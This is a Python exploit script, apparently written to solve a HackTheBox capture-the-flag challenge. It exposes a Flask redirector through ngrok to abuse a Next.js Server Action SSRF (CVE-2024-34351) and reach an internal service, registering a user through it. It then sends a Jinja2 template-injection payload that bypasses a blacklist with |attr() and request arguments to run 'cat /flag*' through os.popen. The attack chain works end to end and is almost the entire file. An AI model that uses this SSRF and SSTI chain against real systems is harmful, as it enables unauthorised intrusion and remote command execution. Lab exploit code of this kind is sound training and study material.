import requests
import json
import sys
import re
import threading

from flask import Flask, Response, redirect, request
from pyngrok import ngrok


REGISTER_USER = len(sys.argv) > 1 and sys.argv[1] == "-r"
BASE_URL = "http://localhost:1337"
# BASE_URL = "http://154.57.164.74:30798"
NGROK_TOKEN = "REDACTED"    # Needs to be taken from the NGrok dashboard
FLASK_PORT = 8001

app = Flask(__name__)


#################### FLASK SSRF REDIRECTOR ####################
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp

    if REGISTER_USER:
        internal_url = f"http://0.0.0.0:3000/register?username={user['username']}&password={user['password']}"

        print("[*] Sending SSRF to register user...")
        return redirect(internal_url, code=302)
    else:
        # We'll use `|attr()` and `request.args` to bypass the blacklist
        # We want to achieve the following command with this whole payload:
        #       `print(config.__class__.__init__.__globals__.get('os').popen('cat /flag*').read())`
        payload = {
            "token": user.get("token", ""),
            "directory": (
                "{%print(config|attr(request|attr('args')|attr('get')('a'))"
                "|attr(request|attr('args')|attr('get')('b'))"
                "|attr(request|attr('args')|attr('get')('c'))"
                "|attr(request|attr('args')|attr('get')('d'))('os')"
                "|attr(request|attr('args')|attr('get')('e'))(request|attr('args')|attr('get')('cmd'))"
                "|attr(request|attr('args')|attr('get')('f'))())%}"
            ),
            "cmd": "cat /flag*",
            "a": "__class__",
            "b": "__init__",
            "c": "__globals__",
            "d": "get",
            "e": "popen",
            "f": "read"
        }

        internal_url = f"http://0.0.0.0:3000/home?" + "&".join(f"{k}={v}" for k, v in payload.items())

        print("[*] Sending SSTI payload...")
        return redirect(internal_url, code=302), payload


def run_flask():
    app.run(host="0.0.0.0", port=FLASK_PORT, threaded=True, debug=False)


# Useful links:
#   - https://0day.work/jinja2-template-injection-filter-bypasses/
#   - https://nvd.nist.gov/vuln/detail/CVE-2024-34351
#   - https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io
#   - https://dashboard.ngrok.com/get-started/setup/linux
#
def solve():
    print("[*] Starting ngrok tunnel...")
    ngrok.set_auth_token(NGROK_TOKEN)
    public_url = ngrok.connect(FLASK_PORT).public_url
    host_header = public_url.replace("https://", "").replace("http://", "")

    threading.Thread(target=run_flask, daemon=True).start()
    print(f"[+] Ngrok URL: {public_url}")

    session = requests.Session()
    global user
    user = {"username": "vego", "password": "vego"}

    # Get Action ID for SSRF
    print("[*] Fetching Action ID...")
    response = session.get(f"{BASE_URL}/")
    action_match = re.search(r'name="\$ACTION_ID_(\w+)"', response.text)
    if not action_match:
        print("[-] Action ID not found.")
        exit(-1)
    
    action_id = action_match.group(1)
    print(f"[+] Found Action ID: {action_id}")

    # Load user from JSON file if already registered, otherwise we'll register a new user through the SSRF.
    if not REGISTER_USER:
        try:
            with open("user.json", "r") as f:
                user = json.load(f)
        except:
            print("[-] Missing user.json. Run with '-r' flag first.")
            return

    headers = {
        "Next-Action": action_id,
        "Host": host_header,
        "Origin": public_url,
        "Content-Type": "text/plain;charset=UTF-8"
    }

    response = session.post(f"{BASE_URL}/", headers=headers, data="[]")

    if not REGISTER_USER:
        if response.status_code == 303 and "HTB" in response.text:
            flag = re.search(r"HTB\{.*?\}", response.text).group(0)
            print(f"[+] FLAG: {flag}")
        else:
            print(f"[-] Exploit failed. Status code: {response.status_code}")
            print(response.text)
    else:
        if response.status_code == 303 and "User created with token:" in response.text:
            token = re.search(r"User created with token: (\w+)", response.text).group(1)
            print(f"[+] User registered successfully! Token: {token}")

            user["token"] = token
            with open("user.json", "w") as f:
                json.dump(user, f)
            print("[+] User saved to user.json")
        else:
            print(f"[-] User registration failed. Status code: {response.status_code}")
            print(response.text)

    ngrok.disconnect(public_url)


if __name__ == "__main__":
    solve()
